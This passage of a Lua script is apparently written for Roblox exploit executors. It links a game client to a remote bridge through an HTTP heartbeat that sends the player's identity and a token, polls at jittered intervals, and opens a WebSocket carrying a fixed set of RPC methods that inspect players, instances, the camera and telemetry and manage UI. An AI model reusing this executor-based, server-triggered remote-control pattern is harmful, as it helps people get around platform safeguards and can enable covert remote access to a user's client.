					characterPath = character and getSafeFullName(character) or nil,
					health = humanoid and humanoid.Health or nil,
					maxHealth = humanoid and humanoid.MaxHealth or nil,
					moveDirection = humanoid and serializeData(humanoid.MoveDirection) or nil,
					walkSpeed = humanoid and humanoid.WalkSpeed or nil,
					position = humanoidRootPart and serializeData(humanoidRootPart.Position) or nil,
					velocity = humanoidRootPart and serializeData(humanoidRootPart.AssemblyLinearVelocity) or nil,
				})
			end

			return { count = #characterList, characters = characterList }
		end,
		["workspace.summary"] = function(params)
			local maxDescendants = math.floor(clampValue(params.maxDescendants, 1, 5000, 2000))
			local classCounts = {}
			local topLevelInstances = {}

			for _, child in ipairs(Workspace:GetChildren()) do
				table.insert(topLevelInstances, getInstanceInfo(child))
			end

			local totalScanned = searchInstancesBreadthFirst(Workspace, maxDescendants, function(candidate)
				classCounts[candidate.ClassName] = (classCounts[candidate.ClassName] or 0) + 1
			end)

			return {
				topLevel = topLevelInstances,
				topLevelCount = #topLevelInstances,
				totalScanned = totalScanned,
				truncated = totalScanned >= maxDescendants,
				classCounts = classCounts,
			}
		end,
		["instance.find"] = function(params)
			local targetRoot, pathErr = resolveInstancePath(params.root or "Workspace")

			if not targetRoot then
				error(pathErr)
			end

			local nameFilter = string.lower(trimString(params.nameContains))
			local classFilter = trimString(params.className)
			local matchLimit = math.floor(clampValue(params.limit, 1, 200, 50))
			local matches = {}

			local scannedCount = searchInstancesBreadthFirst(targetRoot, math.floor(clampValue(params.scanLimit, 1, 10000, 3000)), function(candidate)
				local matchesName = nameFilter == "" or string.find(string.lower(candidate.Name), nameFilter, 1, true) ~= nil
				local matchesClass = false

				if classFilter ~= "" and candidate.ClassName ~= classFilter then
					pcall(function()
						matchesClass = candidate:IsA(classFilter)
					end)
				end

				if matchesName and (classFilter == "" or candidate.ClassName == classFilter or matchesClass) then
					table.insert(matches, getInstanceInfo(candidate))
				end

				return #matches >= matchLimit
			end)

			return { root = getSafeFullName(targetRoot), scanned = scannedCount, count = #matches, matches = matches }
		end,
		["instance.children"] = function(params)
			local parentInstance, pathErr = resolveInstancePath(params.path)

			if not parentInstance then
				error(pathErr)
			end

			local childLimit = math.floor(clampValue(params.limit, 1, 500, 100))
			local children = parentInstance:GetChildren()
			local childList = {}

			for i = 1, math.min(#children, childLimit) do
				table.insert(childList, getInstanceInfo(children[i]))
			end

			return { parent = getInstanceInfo(parentInstance), total = #children, returned = #childList, children = childList }
		end,
		["instance.inspect"] = function(params)
			local targetInstance, pathErr = resolveInstancePath(params.path)

			if not targetInstance then
				error(pathErr)
			end

			local requestedProps = {}

			for _, propName in ipairs(defaultInspectProperties) do
				requestedProps[propName] = true
			end

			if type(params.properties) == "table" then
				for _, property in ipairs(params.properties) do
					requestedProps[tostring(property)] = true
				end
			end

			local inspectedProps = {}
			local unavailableProps = {}

			for propName in pairs(requestedProps) do
				local propVal, unavailReason = getSafeProperty(targetInstance, propName)

				if unavailReason then
					unavailableProps[propName] = unavailReason
				else
					inspectedProps[propName] = propVal
				end
			end

			return {
				instance = getInstanceInfo(targetInstance),
				attributes = serializeData(targetInstance:GetAttributes()),
				tags = serializeData(targetInstance:GetTags()),
				childCount = #targetInstance:GetChildren(),
				properties = inspectedProps,
				unavailable = unavailableProps,
			}
		end,
		["instance.attributes"] = function(params)
			local targetInstance, pathErr = resolveInstancePath(params.path)

			if not targetInstance then
				error(pathErr)
			end

			return { instance = getInstanceInfo(targetInstance), attributes = serializeData(targetInstance:GetAttributes()) }
		end,
		["camera.get"] = function()
			local currentCamera = Workspace.CurrentCamera

			if not currentCamera then
				error("CurrentCamera is unavailable")
			end

			return {
				path = getSafeFullName(currentCamera),
				cameraType = tostring(currentCamera.CameraType),
				fieldOfView = currentCamera.FieldOfView,
				viewportSize = serializeData(currentCamera.ViewportSize),
				cframe = serializeData(currentCamera.CFrame),
				focus = serializeData(currentCamera.Focus),
				subject = serializeData(currentCamera.CameraSubject),
			}
		end,
		["telemetry.snapshot"] = function()
			local delta = RunService2.RenderStepped:Wait()
			local totalMemoryUsageMb = nil

			pcall(function()
				totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
			end)

			return {
				fpsEstimate = delta > 0 and math.floor(1 / delta + 0.5) or nil,
				frameDeltaMs = delta * 1000,
				memoryMb = totalMemoryUsageMb,
				playerCount = #Players2:GetPlayers(),
				placeId = game.PlaceId,
				jobId = game.JobId,
				distributedGameTime = Workspace.DistributedGameTime,
				timestamp = DateTime.now().UnixTimestampMillis,
			}
		end,
		["ui.create"] = function(params)
			local rootGui, guiErr = getMcpRootGui(true)

			if not rootGui then
				error(guiErr)
			end

			if params.replace ~= false then
				cleanupMcpConnections(rpcHandlers)

				for _, child in ipairs(rootGui:GetChildren()) do
					child:Destroy()
				end
			end

			local stateStats = { count = 0 }
			local createdInstance, propResult = buildUiNode(params.tree, rootGui, 1, stateStats)
			return { created = getInstanceInfo(createdInstance), objectCount = stateStats.count, propertyResult = propResult }
		end,
		["ui.update"] = function(params)
			local targetUi, err = getManagedUi(params.path)

			if not targetUi then
				error(err)
			end

			return { instance = getInstanceInfo(targetUi), result = applyUiProperties(targetUi, params.props) }
		end,
		["ui.delete"] = function(params)
			local trimmedPath = trimString(params.path)
			local targetUi, err = getManagedUi(trimmedPath)

			if not targetUi then
				if trimmedPath == "" then
					return { deleted = false, reason = "managed UI does not exist" }
				end
				error(err)
			end

			cleanupMcpConnections(rpcHandlers)
			local uiFullName = getSafeFullName(targetUi)
			targetUi:Destroy()
			return { deleted = true, path = uiFullName }
		end,
		["ui.list"] = function(params)
			local rootGui, guiErr = getMcpRootGui(false)
			if not rootGui then
				return { exists = false, reason = guiErr or "managed UI does not exist" }
			end
			local maxDepthVal = math.floor(clampValue(params.maxDepth, 1, 10, 6))
			return { exists = true, tree = buildInstanceTree(rootGui, 0, maxDepthVal) }
		end,
		["ui.notify"] = function(params)
			local rootGui, guiErr = getMcpRootGui(true)

			if not rootGui then
				error(guiErr)
			end

			local notifications = rootGui:FindFirstChild("Notifications")

			if not notifications then
				notifications = Instance.new("Frame")
				notifications.Name = "Notifications"
				notifications.AnchorPoint = Vector2.new(1, 0)
				notifications.Position = UDim2.new(1, -16, 0, 16)
				notifications.Size = UDim2.fromOffset(360, 500)
				notifications.BackgroundTransparency = 1
				notifications.Parent = rootGui
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.Padding = UDim.new(0, 8)
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = notifications
			end

			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Notification_" .. HttpService:GenerateGUID(false)
			textLabel.Size = UDim2.fromOffset(340, 64)
			textLabel.BackgroundColor3 = parseColor3(params.color) or Color3.fromRGB(25, 35, 52)
			textLabel.BackgroundTransparency = 0.08
			textLabel.Text = tostring(params.text):sub(1, 500)
			textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
			textLabel.TextSize = 16
			textLabel.Font = Enum.Font.GothamMedium
			textLabel.TextWrapped = true
			textLabel.Parent = notifications
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 10)
			uiCorner.Parent = textLabel
			local duration = clampValue(params.duration, 0.5, 30, 4)

			task.delay(duration, function()
				if textLabel.Parent then
					textLabel:Destroy()
				end
			end)

			return { shown = true, name = textLabel.Name, duration = duration }
		end,
	}

	local function handleRpcRequest(requestPayload)
		local requestId = tostring(requestPayload.requestId or "")
		local methodName = tostring(requestPayload.method or "")
		local methodHandler = rpcMethods[methodName]
		if requestId == "" then
			return
		end

		if not methodHandler then
			sendWsMessage({
				type = "rpc_result",
				requestId = requestId,
				success = false,
				error = "Unknown or disallowed method: " .. methodName,
			})

			return
		end

		task.spawn(function()
			local ok, result = xpcall(function()
				return methodHandler(type(requestPayload.params) == "table" and requestPayload.params or {})
			end, function(err)
				return debug.traceback(tostring(err), 2)
			end)

			if ok then
				sendWsMessage({ type = "rpc_result", requestId = requestId, success = true, data = serializeData(result) })
			else
				sendWsMessage({ type = "rpc_result", requestId = requestId, success = false, error = tostring(result):sub(1, 2000) })
			end
		end)
	end

	local function handleMcpMessage(rawPayload)
		local ok, message = pcall(function()
			return HttpService:JSONDecode(tostring(rawPayload))
		end)

		if not ok or type(message) ~= "table" then
			mcpWarn("Invalid JSON message")
			return
		end

		if message.type == "identify_ok" then
			mcpPrint("Connected to bridge. Client ID:", tostring(message.clientId))
			local methodKeys = {}

			for methodName in pairs(rpcMethods) do
				table.insert(methodKeys, methodName)
			end

			table.sort(methodKeys)
			sendRpcEvent("agent.ready", { clientId = message.clientId, methods = methodKeys, playerCount = #Players2:GetPlayers() })
			return
		end

		if message.type == "pong" then
			mcpPrint("PONG", tostring(message.seq or ""))
			return
		end

		if message.type == "rpc_request" then
			handleRpcRequest(message)
			return
		end

		if message.type == "identify_error" then
			mcpWarn("Bridge rejected identity:", tostring(message.error))
		end
	end

	local function disconnectWebsocket()
		isWsReady = false
		cleanupMcpConnections(pendingRequests)
		if not wsConnection then
			return
		end

		pcall(function()
			if type(wsConnection.Close) == "function" then
				wsConnection:Close()
			elseif type(wsConnection.close) == "function" then
				wsConnection:close()
			end
		end)

		wsConnection = nil
	end

	local function connectWebsocket()
		local wsConnectFn, wsApiName = getWebsocketApi()
		if not wsConnectFn then
			mcpWarn("No supported WebSocket API found")
			return false
		end
		lastHeartbeatId += 1
		local currentSessionId = lastHeartbeatId
		mcpPrint("Connecting to", mcpWsUrl, "using", wsApiName)

		local ok, result = pcall(function()
			return wsConnectFn(mcpWsUrl)
		end)

		if not ok or not result then
			mcpWarn("Connection failed:", tostring(result))
			return false
		end
		wsConnection = result
		isWsReady = true
		local onMessage = findAvailableFunction(wsConnection, "OnMessage", "MessageReceived")
		local onClose = findAvailableFunction(wsConnection, "OnClose", "Closed", "OnDisconnect")
		local onError = findAvailableFunction(wsConnection, "OnError", "Error")

		local messageConnection = safeConnectEvent(onMessage, function(msgData)
			if currentSessionId == lastHeartbeatId then
				handleMcpMessage(msgData)
			end
		end)

		if messageConnection then
			table.insert(pendingRequests, messageConnection)

			local closeConnection = safeConnectEvent(onClose, function(...)
				if currentSessionId == lastHeartbeatId then
					isWsReady = false
					mcpWarn("Socket closed", ...)
				end
			end)

			if closeConnection then
				table.insert(pendingRequests, closeConnection)
			end

			local errorConnection = safeConnectEvent(onError, function(...)
				if currentSessionId == lastHeartbeatId then
					mcpWarn("Socket error", ...)
					isWsReady = false
				end
			end)

			if errorConnection then
				table.insert(pendingRequests, errorConnection)
			end

			local identifySent, identifyError = sendWsMessage({
				type = "identify",
				clientType = "roblox",
				token = mcpToken,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				userId = localPlayer2.UserId,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = mcpVersion,
			})

			if not identifySent then
				mcpWarn(identifyError)
				isWsReady = false
			end

			task.spawn(function()
				while shouldRun and isWsReady and currentSessionId == lastHeartbeatId do
					task.wait(20)

					if shouldRun and isWsReady and currentSessionId == lastHeartbeatId then
						messageCount += 1
						local pingSent, pingError = sendWsMessage({ type = "ping", seq = messageCount })

						if not pingSent then
							mcpWarn("Heartbeat failed:", tostring(pingError))
							isWsReady = false
						end
					end
				end
			end)

			while shouldRun and isWsReady and currentSessionId == lastHeartbeatId do
				task.wait(0.5)
			end

			if currentSessionId == lastHeartbeatId then
				disconnectWebsocket()
			end

			return true
		end

		mcpWarn("Socket has no supported message event")
		disconnectWebsocket()
		return false
	end

	table.insert(mcpConnections, Players2.PlayerAdded:Connect(function(player)
		if isConnecting then
			sendRpcEvent("player.added", getPlayerInfo(player, true))
		end
	end))

	table.insert(mcpConnections, Players2.PlayerRemoving:Connect(function(player)
		if isConnecting then
			sendRpcEvent("player.removing", getPlayerInfo(player, true))
		end
	end))

	sharedEnv.StopChilliLink = function()
		if not shouldRun then
			return
		end
		mcpPrint("Stopping agent")
		shouldRun = false
		lastHeartbeatId += 1
		cleanupMcpConnections(mcpConnections)
		cleanupMcpConnections(rpcHandlers)
		disconnectWebsocket()
	end

	local mcpHttpRequest = syn and syn.request or http_request or request or request_ and request_.request or fluxus and fluxus.request

	local function sendMcpHeartbeat()
		if type(mcpHttpRequest) ~= "function" then
			return nil
		end

		local ok, result = pcall(function()
			return HttpService:JSONEncode({
				token = mcpToken,
				userId = localPlayer2.UserId,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = mcpVersion,
			})
		end)

		if not ok then
			return nil
		end
		local ok2, result2 = pcall(mcpHttpRequest, { Url = mcpHeartbeatUrl, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })
		if not ok2 or type(result2) ~= "table" or tonumber(result2.StatusCode) ~= 200 then
			return nil
		end

		local ok3, result3 = pcall(function()
			return HttpService:JSONDecode(tostring(result2.Body))
		end)

		if ok3 and type(result3) == "table" then
			return result3
		end
		return nil
	end

	task.spawn(function()
		while shouldRun do
			local heartbeatResponse = sendMcpHeartbeat()
			local pollInterval = 60

			if heartbeatResponse then
				pollInterval = clampValue(heartbeatResponse.interval, 5, 600, 60)

				if heartbeatResponse.connect == true and not awaitingHeartbeatResponse and not isWsReady then
					awaitingHeartbeatResponse = true

					task.spawn(function()
						pcall(connectWebsocket)
						awaitingHeartbeatResponse = false
					end)
				end
			end

			task.wait(pollInterval * (0.85 + math.random() * 0.3))
		end

		mcpPrint("Agent stopped")
	end)
end
